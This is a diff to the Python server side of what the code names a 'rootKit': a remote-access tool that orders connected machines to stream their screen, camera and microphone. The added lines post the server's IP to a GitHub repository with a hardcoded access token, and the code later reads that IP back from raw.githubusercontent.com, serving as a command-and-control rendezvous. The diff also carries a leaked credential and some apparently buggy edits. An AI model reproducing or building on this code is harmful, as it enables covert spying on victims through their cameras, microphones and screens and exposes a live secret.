@@ -2,11 +2,40 @@ import socket, time, os, sys, vidstream, pyaudio
 from numpy import array
 from math import *
 import fct
-import threading, requests
+import threading, requests, urllib
 from socketserver import ThreadingMixIn 
 from colored import fg, bg, attr
 from iteration_utilities import duplicates
 from functools import cache
+from github import Github
+def getSelfIp(temp=-1):
+    return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][temp]
+def connected():
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect(("www.google.com", 80))
+        return True
+    except Exception as e:
+        print(e)
+        return False
+if getSelfIp() not in("192.168.249.97") and connected():
+    # First create a Github instance:
+    g = Github("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")
+    # Then play with your Github objects:
+    # for repo in g.get_user().get_repos():
+    #     print(repo.name)
+    repo = g.get_repo("N0SAFE/kit-local")
+    try:
+        contents = repo.get_contents("rootKit/ip")
+        repo.delete_file(contents.path, "remove ip", contents.sha)
+    except:
+        pass
+    repo.create_file("rootKit/ip", "create", getSelfIp())
+    with open('ip.txt', "w") as file:
+        file.write(getSelfIp())
+else:
+    print("vous n'étes pas connecter")
+    exit()
 
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
 reset, sendAndReceive, mythreads, threadConnected = attr(0), [], [], []
@@ -105,6 +134,7 @@ class myThread(threading.Thread):
     def currentThread(self, thread):
         self.currentthread = thread
     def send(self, data):
+        data.replace("9", "8+1")
         self.con.sendall(data.encode())
         time.sleep(0.05)
     def stop(self):
@@ -233,6 +263,7 @@ class getConnected():
         return ret
 
 # Programme du serveur TCP
+
 port, ipHost = 9999, requests.get(f"{githubUrl}ip").text.replace("\n", "")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
@@ -278,10 +309,11 @@ def send(data, THREAD=None):
         for thread in THREAD:
             try:
                 if data.split()[0] in ("screen"):
-                    if not thread.screenIsAlive():
+                    if thread.screenIsAlive():
                         thread.send(f"screen {thread.getPortScreen()}")
                 elif data.split()[0] in ("camera"):
-                    if not thread.cameraIsAlive():
+                    print(thread.cameraIsAlive())
+                    if thread.cameraIsAlive():
                         thread.send(f"camera {thread.getPortCamera()}")
                 elif data.split()[0] in ("microphone"):
                     if not thread.micLives():
@@ -322,8 +354,6 @@ def runThreadingSendAndReceive(data):
         loop+=1
     time.sleep(5)
 
-def getSelfIp(temp=-1):
-    return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][temp]
 def testIfIpTrue(data, total=False):
     if total == False:
         for i in range(len(data.split('.'))):
